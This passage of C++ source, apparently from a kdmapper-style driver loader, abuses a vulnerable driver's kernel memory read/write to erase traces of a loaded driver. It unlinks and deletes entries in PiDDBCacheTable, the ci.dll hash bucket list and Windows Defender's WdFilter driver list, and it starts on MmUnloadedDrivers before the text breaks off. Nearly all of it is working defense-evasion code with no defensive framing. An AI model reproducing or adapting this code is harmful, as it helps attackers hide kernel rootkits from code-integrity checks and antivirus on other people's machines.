#include "utils.h"
#include "vulndriver.h"
#pragma warning(disable : 4267)
#define RUNTIMEDRIVERSARRAY_MAXSIZE 256
#define DRIVERINFO_MAGIC 0xDA18
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)


LIST_ENTRY* ReadListEntryFromAddress(HANDLE* DeviceHandle, PVOID ListEntryAddress) {
	LIST_ENTRY* ReturnedEntry = NULL;
	if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, ListEntryAddress, &ReturnedEntry, sizeof(ReturnedEntry))) {
		return NULL;
	}
	return ReturnedEntry;
}


nt::PPiDDBCacheEntry VulnurableDriver::PersistenceFunctions::LookupEntryInPiDDBTable(HANDLE* DeviceHandle, PVOID KernelBaseAddress, nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG EntryTimestamp, LPCWSTR DriverName) {
	nt::PiDDBCacheEntry SearchedEntry{};
	SearchedEntry.TimeDateStamp = EntryTimestamp;
	SearchedEntry.DriverName.Buffer = (PWSTR)DriverName;
	SearchedEntry.DriverName.Length = (USHORT)(wcslen(DriverName) * sizeof(WCHAR));
	SearchedEntry.DriverName.MaximumLength = (USHORT)((wcslen(DriverName) + 1) * sizeof(WCHAR));
	return (nt::PPiDDBCacheEntry)specific::HandleElementGenericTable(DeviceHandle, KernelBaseAddress, PiDDBCacheTable, (PVOID)&SearchedEntry, TRUE);
}


NTSTATUS VulnurableDriver::PersistenceFunctions::CleanPiDDBCacheTable(HANDLE* DeviceHandle, PVOID KernelBaseAddress, LPCWSTR DriverName, PVOID* ActualPiDDBLock, nt::PRTL_AVL_TABLE* ActualPiDDBCacheTable, ULONG DriverTimestamp) {
	BYTE FirstLockData[] = "\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24";
	BYTE SecondLockData[] = "\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8";
	BYTE TableData[] = "\x66\x03\xD2\x48\x8D\x0D";
	const char* FirstLockMask = "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x";
	const char* SecondLockMask = "xxx????xxxxx????xxx????x????x";
	const char* TableMask = "xxxxxx";
	ULONG FirstLockOffset = 28;  // Offset from the first lock pattern to the data
	ULONG SecondLockOffset = 16;  // Offset from the second lock pattern to the data
	PVOID RelativePiDDBLock = NULL;
	PVOID RelativePiDDBCacheTable = NULL;
	nt::PPiDDBCacheEntry DriverTableEntry = NULL;
	PLIST_ENTRY PreviousDriverEntry = NULL;
	PLIST_ENTRY NextDriverEntry = NULL;
	ULONG TableDeleteCount = 0;


	// Find PiDDBLock and PiDDBCacheTable with matching patterns:
	RelativePiDDBLock = VulnurableDriver::HelperFunctions::FindPatternInSectionOfKernelModule(DeviceHandle, "PAGE", KernelBaseAddress, FirstLockData, FirstLockMask);
	RelativePiDDBCacheTable = VulnurableDriver::HelperFunctions::FindPatternInSectionOfKernelModule(DeviceHandle, "PAGE", KernelBaseAddress, TableData, TableMask);
	if (RelativePiDDBLock == NULL) {
		RelativePiDDBLock = VulnurableDriver::HelperFunctions::FindPatternInSectionOfKernelModule(DeviceHandle, "PAGE", KernelBaseAddress, SecondLockData, SecondLockMask);
		if (RelativePiDDBLock == NULL) {
			printf("[-] Cannot clean PiDDBCacheTable - PiDDBLock not found with both patterns\n");
			return STATUS_UNSUCCESSFUL;
		}
		printf("[+] Found PiDDBLock with second pattern at address %p\n", RelativePiDDBLock);
		RelativePiDDBLock = general::ManipulateAddress(RelativePiDDBLock, SecondLockOffset, TRUE);
	}
	else {
		printf("[+] Found PiDDBLock with first pattern at address %p\n", RelativePiDDBLock);
		RelativePiDDBLock = general::ManipulateAddress(RelativePiDDBLock, FirstLockOffset, TRUE);
	}
	if (RelativePiDDBCacheTable == NULL) {
		printf("[-] Cannot clean PiDDBCacheTable - PiDDBCacheTable not found  pattern\n");
		return STATUS_UNSUCCESSFUL;
	}
	else {
		printf("[+] Found PiDDBCacheTable with pattern at address %p\n", RelativePiDDBCacheTable);
	}


	// Parse the relative addresses in the system module to the actual address:
	*ActualPiDDBLock = VulnurableDriver::HelperFunctions::RelativeAddressToActual(DeviceHandle, RelativePiDDBLock, 3, 7);
	*ActualPiDDBCacheTable = (nt::PRTL_AVL_TABLE)VulnurableDriver::HelperFunctions::RelativeAddressToActual(DeviceHandle, RelativePiDDBCacheTable, 6, 10);


	// Acquire the PiDDB lock to manipulate the table:
	if (!specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualPiDDBLock, TRUE)) {
		printf("[-] Cannot lock PiDDBCacheLock - HandleResourceLite failed\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("[+] Locked PiDDBCacheLock\n");


	// Search the entry of the driver in the PiDDB table:
	DriverTableEntry = (nt::PPiDDBCacheEntry)VulnurableDriver::PersistenceFunctions::LookupEntryInPiDDBTable(DeviceHandle, KernelBaseAddress, *ActualPiDDBCacheTable, DriverTimestamp, DriverName);
	if (DriverTableEntry == NULL) {
		wprintf(L"[-] Cannot find entry for driver %s in PiDDBCacheTable\n", DriverName);
		specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualPiDDBLock, FALSE);
		return STATUS_UNSUCCESSFUL;
	}
	wprintf(L"[+] Found PiDDBCacheTable entry for driver %s: %p\n", DriverName, (PVOID)DriverTableEntry);


	// Unlink LIST_ENTRY of driver from the list of drivers:
	if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, general::ManipulateAddress(DriverTableEntry, (offsetof(struct nt::_PiDDBCacheEntry, List.Blink)), TRUE), &PreviousDriverEntry, sizeof(PreviousDriverEntry))) {
		wprintf(L"[-] Cannot get previous LIST_ENTRY to hide the driver %s\n", DriverName);
		specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualPiDDBLock, FALSE);
		return STATUS_UNSUCCESSFUL;
	}
	if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, general::ManipulateAddress(DriverTableEntry, (offsetof(struct nt::_PiDDBCacheEntry, List.Flink)), TRUE), &NextDriverEntry, sizeof(PreviousDriverEntry))) {
		wprintf(L"[-] Cannot get next LIST_ENTRY to hide the driver %s\n", DriverName);
		specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualPiDDBLock, FALSE);
		return STATUS_UNSUCCESSFUL;
	}
	if (!VulnurableDriver::IoctlFunctions::MemoryWrite(DeviceHandle, general::ManipulateAddress(PreviousDriverEntry, (offsetof(struct nt::_PiDDBCacheEntry, List.Flink)), TRUE), &NextDriverEntry, sizeof(NextDriverEntry))) {
		wprintf(L"[-] Cannot overwrite next LIST_ENTRY of previous LIST_ENTRY to hide the driver %s\n", DriverName);
		specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, ActualPiDDBLock, FALSE);
		return STATUS_UNSUCCESSFUL;
	}
	if (!VulnurableDriver::IoctlFunctions::MemoryWrite(DeviceHandle, general::ManipulateAddress(NextDriverEntry, (offsetof(struct nt::_PiDDBCacheEntry, List.Blink)), TRUE), &PreviousDriverEntry, sizeof(PreviousDriverEntry))) {
		wprintf(L"[-] Cannot overwrite previous LIST_ENTRY of next LIST_ENTRY to hide the driver %s\n", DriverName);
		specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualPiDDBLock, FALSE);
		return STATUS_UNSUCCESSFUL;
	}


	// Delete actual PiDDB entry:
	if (!specific::HandleElementGenericTable(DeviceHandle, KernelBaseAddress, *ActualPiDDBCacheTable, (PVOID)DriverTableEntry, FALSE)) {
		wprintf(L"[-] Cannot delete actual entry of driver %s in PiDDB table, entry is at %p\n", DriverName, (PVOID)DriverTableEntry);
		specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualPiDDBLock, FALSE);
		return STATUS_UNSUCCESSFUL;
	}


	// Decrease the deleted drivers counter in the PiDDB table and release the lock:
	if (VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, general::ManipulateAddress(*ActualPiDDBCacheTable, offsetof(struct nt::_RTL_AVL_TABLE, DeleteCount), TRUE), &TableDeleteCount, sizeof(TableDeleteCount)) && TableDeleteCount > 0) {
		TableDeleteCount--;
		VulnurableDriver::IoctlFunctions::MemoryWrite(DeviceHandle, general::ManipulateAddress(*ActualPiDDBCacheTable, offsetof(struct nt::_RTL_AVL_TABLE, DeleteCount), TRUE), &TableDeleteCount, sizeof(TableDeleteCount));
	}
	specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualPiDDBLock, FALSE);
	return STATUS_SUCCESS;
}


NTSTATUS VulnurableDriver::PersistenceFunctions::CleanKernelHashBucketList(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID* ActualHashBucketList, PVOID* ActualHashBucketLock,
	LPCWSTR DriverName, LPCWSTR DriverFullPath) {
	BYTE NeededListData[] = "\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00";
	const char* HashBucketListMask = "xxx????x?xxxxxxx";
	BYTE NeededLockData[] = "\x48\x8D\x0D";
	const char* HashBucketLockMask = "xxx";
	WCHAR* CurrentDriverNamePointer = NULL;
	WCHAR CurrentDriverName[MAX_PATH] = { 0 };
	ULONG HashLockBackwardOffset = 50;
	USHORT ExpectedDriverNameSize = (wcslen(DriverFullPath) - 2) * sizeof(WCHAR);
	USHORT CurrentDriverNameLength = 0;
	nt::HashBucketEntry* PreviousEntry = NULL;
	nt::HashBucketEntry* CurrentEntry = NULL;
	nt::HashBucketEntry* NextEntry = NULL;  // Only used after finding the entry to patch for patching the doubly linked list
	PVOID RelativeHashBucketList = NULL;
	PVOID RelativeHashBucketLock = NULL;
	PVOID CiDLLAddress = specific::GetKernelModuleAddress("ci.dll");
	if (CiDLLAddress == NULL) {
		wprintf(L"[-] Cannot delete actual entry of driver %s in hash bucket list table, ci.dll address is unknown\n", DriverName);
		return STATUS_UNSUCCESSFUL;
	}


	// Get the address of HashBucketList and HashBucketLock by pattern matching:
	RelativeHashBucketList = VulnurableDriver::HelperFunctions::FindPatternInSectionOfKernelModule(DeviceHandle, "PAGE", CiDLLAddress, NeededListData, HashBucketListMask);
	if (RelativeHashBucketList == NULL) {
		wprintf(L"[-] Cannot delete actual entry of driver %s in hash bucket list table, cannot match pattern to find HashTableBucketList\n", DriverName);
		return STATUS_UNSUCCESSFUL;
	}
	RelativeHashBucketLock = VulnurableDriver::HelperFunctions::FindPatternInKernelModule(DeviceHandle, general::ManipulateAddress(RelativeHashBucketList, HashLockBackwardOffset, FALSE), HashLockBackwardOffset, NeededLockData, HashBucketLockMask);
	if (RelativeHashBucketLock == NULL) {
		wprintf(L"[-] Cannot delete actual entry of driver %s in hash bucket list table, cannot match pattern to find HashTableBucketLock\n", DriverName);
		return STATUS_UNSUCCESSFUL;
	}


	// Translate the relative address of list and lock to the actual addresses:
	*ActualHashBucketList = VulnurableDriver::HelperFunctions::RelativeAddressToActual(DeviceHandle, RelativeHashBucketList, 3, 7);
	*ActualHashBucketLock = VulnurableDriver::HelperFunctions::RelativeAddressToActual(DeviceHandle, RelativeHashBucketLock, 3, 7);
	if (*ActualHashBucketList == NULL || *ActualHashBucketLock == NULL) {
		wprintf(L"[-] Cannot delete actual entry of driver %s in hash bucket list table, list address = %p, lock address = %p\n", DriverName, *ActualHashBucketList, *ActualHashBucketLock);
		return STATUS_UNSUCCESSFUL;
	}


	// Acquire  lock to modify the list:
	if (!specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, TRUE)) {
		printf("[-] Cannot lock ActualHashBucketLock - HandleResourceLite failed\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("[+] Locked ActualHashBucketLock\n");


	// Iterate over the list and try to find entry:
	PreviousEntry = (nt::HashBucketEntry*)*ActualHashBucketList;
	CurrentEntry = NULL;
	if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, (PVOID)PreviousEntry, &CurrentEntry, sizeof(CurrentEntry))) {
		wprintf(L"[-] Cannot get hash bucket list entry to hide the driver %s\n", DriverName);
		specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, FALSE);
		return STATUS_UNSUCCESSFUL;
	}
	if (CurrentEntry == NULL) {
		wprintf(L"[+] HashBucketList is empty, no need to continue to hide driver %s\n", DriverName);
		specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, FALSE);
		return STATUS_SUCCESS;
	}
	while (CurrentEntry != NULL) {
		if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, general::ManipulateAddress(CurrentEntry, offsetof(nt::_HashBucketEntry, DriverName.Length), TRUE), &CurrentDriverNameLength, sizeof(CurrentDriverNameLength)) || CurrentDriverNameLength == 0) {
			wprintf(L"[-] Cannot get length of current hash bucket list entry driver name, searched driver %s\n", DriverName);
			specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, FALSE);
			return STATUS_UNSUCCESSFUL;
		}
		if (ExpectedDriverNameSize == CurrentDriverNameLength) {
			if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, general::ManipulateAddress(CurrentEntry, offsetof(nt::_HashBucketEntry, DriverName.Buffer), TRUE), &CurrentDriverNamePointer, sizeof(CurrentDriverNamePointer)) || CurrentDriverNamePointer == NULL) {
				wprintf(L"[-] Cannot get pointer to driver name of current hash bucket list entry, searched driver %s\n", DriverName);
				specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, FALSE);
				return STATUS_UNSUCCESSFUL;
			}
			if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, CurrentDriverNamePointer, CurrentDriverName, CurrentDriverNameLength) || wcscmp(CurrentDriverName, L"") == 0) {
				wprintf(L"[-] Cannot get driver name of current hash bucket list entry, searched driver %s\n", DriverName);
				specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, FALSE);
				return STATUS_UNSUCCESSFUL;
			}

			// Search for DriverName in CurrentDriverName, if exists in it - this is the entry to hide:
			if (wcscmp(CurrentDriverName, DriverFullPath) == 0) {
				wprintf(L"[+] Found entry of driver %s with full path %s at address %p\n", DriverName, DriverFullPath, (PVOID)CurrentEntry);
				if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, (PVOID)CurrentEntry, &NextEntry, sizeof(NextEntry))) {
					wprintf(L"[-] Cannot get next hash bucket list entry after finding entry to patch\n");
					specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, FALSE);
					return STATUS_UNSUCCESSFUL;
				}
				if (!VulnurableDriver::IoctlFunctions::MemoryWrite(DeviceHandle, (PVOID)PreviousEntry, &NextEntry, sizeof(NextEntry))) {
					wprintf(L"[-] Cannot write pointer to next entry for previous entry to patch the list\n");
					specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, FALSE);
					return STATUS_UNSUCCESSFUL;
				}
				if (!specific::HandleExFreePool(DeviceHandle, KernelBaseAddress, (PVOID)CurrentEntry)) {
					wprintf(L"[-] Cannot free pool of current entry with ExFreePool export\n");
					specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, FALSE);
					return STATUS_UNSUCCESSFUL;
				}
				if (!specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, FALSE)) {
					printf("[-] Cannot unlock ActualHashBucketLock - HandleResourceLite failed, final after patching\n");
					return STATUS_UNSUCCESSFUL;
				}
				printf("[+] Unlocked ActualHashBucketLock, patched hash bucket list entry\n");
				return STATUS_SUCCESS;
			}
		}
		PreviousEntry = CurrentEntry;
		RtlZeroMemory(CurrentDriverName, MAX_PATH);
		CurrentDriverNamePointer = NULL;
		CurrentDriverNameLength = 0;

		// Get next entry:
		if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, (PVOID)CurrentEntry, &CurrentEntry, sizeof(CurrentEntry))) {
			wprintf(L"[-] Cannot get next hash bucket list entry, searched driver %s\n", DriverName);
			specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, FALSE);
			return STATUS_UNSUCCESSFUL;
		}
	}


	// Release lock:
	if (!specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, FALSE)) {
		printf("[-] Cannot unlock ActualHashBucketLock - HandleResourceLite failed\n");
	}
	return STATUS_UNSUCCESSFUL;
}


NTSTATUS VulnurableDriver::PersistenceFunctions::CleanWdFilterDriverList(HANDLE* DeviceHandle, PVOID KernelBaseAddress, LPCWSTR DriverName, PVOID* ActualDriversList, PVOID* ActualDriversCount, PVOID* ActualFreeDriverInfo) {
	PVOID RuntimeDriversList = NULL;
	PVOID RuntimeDriversCount = NULL;
	PVOID FreeDriverInfoAddr = NULL;
	PVOID DriversListHeadNode = NULL;
	PVOID DriversListArray = NULL;
	PVOID ExpectedEntryArrayValue = NULL;
	PVOID CurrentArrayValue = NULL;
	PVOID EmptyEntryValue = NULL;
	PVOID HiddenDriverInfo = NULL;
	ULONG CurrentDriversCount = 0;
	USHORT DriverInfoMagic = 0;
	LIST_ENTRY* PreviousEntry = NULL;
	LIST_ENTRY* NextEntry = NULL;
	const char* DriversListMask = "xxx????xx";
	BYTE NeededListData[] = "\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05";
	const char* DriversCountMask = "xx????xxx";
	BYTE NeededCountData[] = "\xFF\x05\x00\x00\x00\x00\x48\x39\x11";
	const char* FreeDriverInfoMask[2] = { "xx?x?xx???????????x", "xx?xx?x???????????x" };
	BYTE NeededFreeInfoDataFirst[] = "\x49\x8B\xC9\x00\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9";
	BYTE NeededFreeInfoDataSecond[] = "\x48\x89\x4A\x00\x49\x8b\x00\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9";
	UNICODE_STRING CurrentDriverUnicodeString = { 0 };
	WCHAR CurrentDriverName[MAX_PATH] = { 0 };
	PVOID WdFilterAddress = specific::GetKernelModuleAddress("WdFilter.sys");
	if (WdFilterAddress == NULL) {
		wprintf(L"[-] Cannot delete actual entry of driver %s in WdFilter driver list, WdFilter.sys address is unknown, skipping..\n", DriverName);
		return STATUS_SUCCESS;  // WdFilter.sys might not even exist on the system
	}


	// Find the list of loaded drivers, counter of loaded drivers and FreeDriverInfo() in WdFilter.sys:
	RuntimeDriversList = VulnurableDriver::HelperFunctions::FindPatternInSectionOfKernelModule(DeviceHandle, "PAGE", WdFilterAddress, NeededListData, DriversListMask);
	if (RuntimeDriversList == NULL) {
		wprintf(L"[-] Cannot delete actual entry of driver %s in WdFilter driver list, cannot match pattern to find RuntimeDriversList\n", DriverName);
		return STATUS_UNSUCCESSFUL;
	}
	RuntimeDriversCount = VulnurableDriver::HelperFunctions::FindPatternInSectionOfKernelModule(DeviceHandle, "PAGE", WdFilterAddress, NeededCountData, DriversCountMask);
	if (RuntimeDriversCount == NULL) {
		wprintf(L"[-] Cannot delete actual entry of driver %s in WdFilter driver list, cannot match pattern to find RuntimeDriversCount\n", DriverName);
		return STATUS_UNSUCCESSFUL;
	}
	/*
	49 8B C9                      mov     rcx, r9         ; P
	49 89 50 08                   mov     [r8+8], rdx
	E8 FB F0 FD FF                call    MpFreeDriverInfoEx
	48 8B 0D FC AA FA FF          mov     rcx, cs:qword_1C0021BF0
	E9 21 FF FF FF                jmp     loc_1C007701A
*/
	FreeDriverInfoAddr = VulnurableDriver::HelperFunctions::FindPatternInSectionOfKernelModule(DeviceHandle, "PAGE", WdFilterAddress, NeededFreeInfoDataFirst, FreeDriverInfoMask[0]);
	if (FreeDriverInfoAddr == NULL) {
		wprintf(L"[-] Cannot delete actual entry of driver %s in WdFilter driver list, cannot match first pattern to find FreeDriverInfo()\n", DriverName);
		FreeDriverInfoAddr = VulnurableDriver::HelperFunctions::FindPatternInSectionOfKernelModule(DeviceHandle, "PAGE", WdFilterAddress, NeededFreeInfoDataSecond, FreeDriverInfoMask[1]);
		if (FreeDriverInfoAddr == NULL) {
			wprintf(L"[-] Cannot delete actual entry of driver %s in WdFilter driver list, cannot match second pattern to find FreeDriverInfo()\n", DriverName);
			return STATUS_UNSUCCESSFUL;
		}
		return STATUS_UNSUCCESSFUL;
	}
	FreeDriverInfoAddr = general::ManipulateAddress(FreeDriverInfoAddr, 0x7, TRUE); // Skip until call instruction, need the jumping address
	/*
	48 89 4A 08                   mov     [rdx+8], rcx
	49 8B C8                      mov     rcx, r8         ; P
	E8 C3 58 FE FF                call    sub_1C0065308
	48 8B 0D 44 41 FA FF          mov     rcx, cs:qword_1C0023B90
	E9 39 FF FF FF                jmp     loc_1C007F98A
*/


	// Parse the relative addresses to the actual addresses:
	*ActualDriversList = VulnurableDriver::HelperFunctions::RelativeAddressToActual(DeviceHandle, RuntimeDriversList, 3, 7);
	DriversListHeadNode = general::ManipulateAddress(*ActualDriversList, 0x8, FALSE);
	*ActualDriversCount = VulnurableDriver::HelperFunctions::RelativeAddressToActual(DeviceHandle, RuntimeDriversCount, 2, 6);
	DriversListArray = general::ManipulateAddress(*ActualDriversCount, 0x8, TRUE);
	EmptyEntryValue = general::ManipulateAddress(*ActualDriversCount, 1, TRUE);  // Not Count + 1 but address(Count) + 1
	VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, DriversListArray, &DriversListArray, sizeof(DriversListArray));
	*ActualFreeDriverInfo = VulnurableDriver::HelperFunctions::RelativeAddressToActual(DeviceHandle, FreeDriverInfoAddr, 1, 5);

	
	// Iterate through the LIST_ENTRY doubly linked list to find the entry of the driver:
	for (LIST_ENTRY* CurrentEntry = ReadListEntryFromAddress(DeviceHandle, DriversListHeadNode);
		CurrentEntry != (LIST_ENTRY*)DriversListHeadNode;
		CurrentEntry = ReadListEntryFromAddress(DeviceHandle, general::ManipulateAddress((PVOID)CurrentEntry, offsetof(struct _LIST_ENTRY, Flink), TRUE))) {
		if (VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, general::ManipulateAddress((PVOID)CurrentEntry, 0x10, TRUE), &CurrentDriverUnicodeString, sizeof(CurrentDriverUnicodeString))) {
			RtlZeroMemory(CurrentDriverName, MAX_PATH);
			if (VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, (PVOID)CurrentDriverUnicodeString.Buffer, CurrentDriverName, CurrentDriverUnicodeString.Length)) {
				if (wcscmp(CurrentDriverName, DriverName) == 0) {
					wprintf(L"[+] Found entry of driver %s to remove in WdFilter list, entry address: %p\n", DriverName, (PVOID)CurrentEntry);
					ExpectedEntryArrayValue = general::ManipulateAddress((PVOID)CurrentEntry, 0x10, FALSE);
					for (ULONG ArrayIndex = 0; ArrayIndex < RUNTIMEDRIVERSARRAY_MAXSIZE; ArrayIndex++) {
						VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, general::ManipulateAddress(DriversListArray, ArrayIndex * sizeof(PVOID), TRUE), &CurrentArrayValue, sizeof(CurrentArrayValue));
						if (CurrentArrayValue == ExpectedEntryArrayValue) {
							// Patch DriversList's value in array to be empty (nonexistent) and run over it in LIST_ENTRY list:
							VulnurableDriver::IoctlFunctions::MemoryWrite(DeviceHandle, general::ManipulateAddress(DriversListArray, ArrayIndex * sizeof(PVOID), TRUE), &EmptyEntryValue, sizeof(EmptyEntryValue));
							NextEntry = ReadListEntryFromAddress(DeviceHandle, general::ManipulateAddress((PVOID)CurrentEntry, offsetof(struct _LIST_ENTRY, Flink), TRUE));
							PreviousEntry = ReadListEntryFromAddress(DeviceHandle, general::ManipulateAddress((PVOID)CurrentEntry, offsetof(struct _LIST_ENTRY, Blink), TRUE));
							VulnurableDriver::IoctlFunctions::MemoryWrite(DeviceHandle, general::ManipulateAddress((PVOID)NextEntry, offsetof(struct _LIST_ENTRY, Blink), TRUE), &PreviousEntry, sizeof(NextEntry->Blink));
							VulnurableDriver::IoctlFunctions::MemoryWrite(DeviceHandle, general::ManipulateAddress((PVOID)PreviousEntry, offsetof(struct _LIST_ENTRY, Flink), TRUE), &NextEntry, sizeof(PreviousEntry->Flink));

							// Decrement RuntimeDriversCount:
							VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, *ActualDriversCount, &CurrentDriversCount, sizeof(CurrentDriversCount));
							CurrentDriversCount--;
							VulnurableDriver::IoctlFunctions::MemoryWrite(DeviceHandle, *ActualDriversCount, &CurrentDriversCount, sizeof(CurrentDriversCount));

							// Call MpFreeDriverInfoEx to free driver info pool:
							HiddenDriverInfo = general::ManipulateAddress((PVOID)CurrentEntry, 0x20, FALSE);

							// Verify DriverInfo magic, if not equal to 0xDA18 might be another version and cause BSoD:
							VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, HiddenDriverInfo, &DriverInfoMagic, sizeof(DriverInfoMagic));
							if (DriverInfoMagic == DRIVERINFO_MAGIC) {
								CallKernelFunction(DeviceHandle, (PVOID*)NULL, *ActualFreeDriverInfo, KernelBaseAddress, HiddenDriverInfo);
							}
							wprintf(L"[+] Successfully cleaned the info of driver %s from WdFilter driver list\n", DriverName);
							return STATUS_SUCCESS;
						}
					}
					wprintf(L"[-] Cannot delete actual entry of driver %s in WdFilter driver list, no right value for entry exists in drivers array\n", DriverName);
					return STATUS_UNSUCCESSFUL;
				}
			}
		}
	}
}


NTSTATUS VulnurableDriver::PersistenceFunctions::CleanMmUnloadedDrivers(HANDLE* DeviceHandle, PVOID KernelBaseAddress, LPCWSTR DriverName) {
	ULONG SystemHandlesSize = 0;
	PVOID SystemHandlesInfo = NULL;
	nt::PSYSTEM_HANDLE_INFORMATION_EX SystemHandleInformation = NULL;
	PVOID CurrentHandleObject = NULL;
	PVOID DriverObject = NULL;
	PVOID DeviceObject = NULL;
	PVOID DriverSection = NULL;
	UNICODE_STRING DriverBaseDllName = { 0 };
	WCHAR MatchingDriverName[MAX_PATH] = { 0 };
	nt::SYSTEM_HANDLE CurrentSystemHandle = { 0 };	
	NTSTATUS Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)nt::SystemExtendedHandleInformation, SystemHandlesInfo, SystemHandlesSize, &SystemHandlesSize);
	
	
	// Allocate enough memory for information and query to get the information:
	while (Status == STATUS_INFO_LENGTH_MISMATCH){
		if (SystemHandlesInfo != NULL) {
			VirtualFree(SystemHandlesInfo, 0, MEM_RELEASE);
		}
		SystemHandlesInfo = VirtualAlloc(NULL, SystemHandlesSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)nt::SystemExtendedHandleInformation, SystemHandlesInfo, SystemHandlesSize, &SystemHandlesSize);
	}
	if (!NT_SUCCESS(Status) || SystemHandlesInfo == NULL){
		if (SystemHandlesInfo != NULL) {
			VirtualFree(SystemHandlesInfo, 0, MEM_RELEASE);
		}
		return FALSE;
	}


	// Find the handle information object associated with the vulnurable driver:
	SystemHandleInformation = (nt::PSYSTEM_HANDLE_INFORMATION_EX)SystemHandlesInfo;
	for (ULONG HandleIndex = 0; HandleIndex < SystemHandleInformation->HandleCount; ++HandleIndex){
		CurrentSystemHandle = SystemHandleInformation->Handles[HandleIndex];
		if (CurrentSystemHandle.UniqueProcessId != (HANDLE)((ULONG64)GetCurrentProcessId())){
			continue;  // ProcessId of object != process ID of kdmapper.exe
		}
		if (CurrentSystemHandle.HandleValue == *DeviceHandle){
			CurrentHandleObject = CurrentSystemHandle.Object;
			break;
		}
	}
	VirtualFree(SystemHandlesInfo, 0, MEM_RELEASE);
	if (CurrentHandleObject == NULL) {
		return STATUS_UNSUCCESSFUL;
	}


	// Read the driver UNICODE_STRING name to change it for hiding the unloaded driver:
	if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, general::ManipulateAddress(CurrentHandleObject, 0x8, TRUE), &DeviceObject, sizeof(DeviceObject)) || DeviceObject == NULL) {
		wprintf(L"[-] Cannot delete actual entry of driver %s in MmUnloadedDrivers(), cannot read DeviceObject\n", DriverName);
		return FALSE;
	}
	if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, general::ManipulateAddress(DeviceObject, 0x8, TRUE), &DriverObject, sizeof(DriverObject)) || DriverObject == NULL) {
		wprintf(L"[-] Cannot delete actual entry of driver %s in MmUnloadedDrivers(), cannot read DriverObject\n", DriverName);
		return FALSE;
	}
	if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, general::ManipulateAddress(DriverObject, 0x28, TRUE), &DriverSection, sizeof(DriverSection)) || DriverSection == NULL) {
		wprintf(L"[-] Cannot delete actual entry of driver %s in MmUnloadedDrivers(), cannot read DriverSection\n", DriverName);
		return FALSE;
	}
	if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, general::ManipulateAddress(DriverSection, 0x58, TRUE), &DriverBaseDllName, sizeof(DriverBaseDllName)) || DriverBaseDllName.Length == 0 || DriverBaseDllName.Buffer == NULL) {
		wprintf(L"[-] Cannot delete actual entry of driver %s in MmUnloadedDrivers(), cannot read DriverBaseDllName\n", DriverName);
		return FALSE;
	}

	if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, DriverBaseDllName.Buffer, (PVOID)MatchingDriverName, DriverBaseDllName.Length)) {
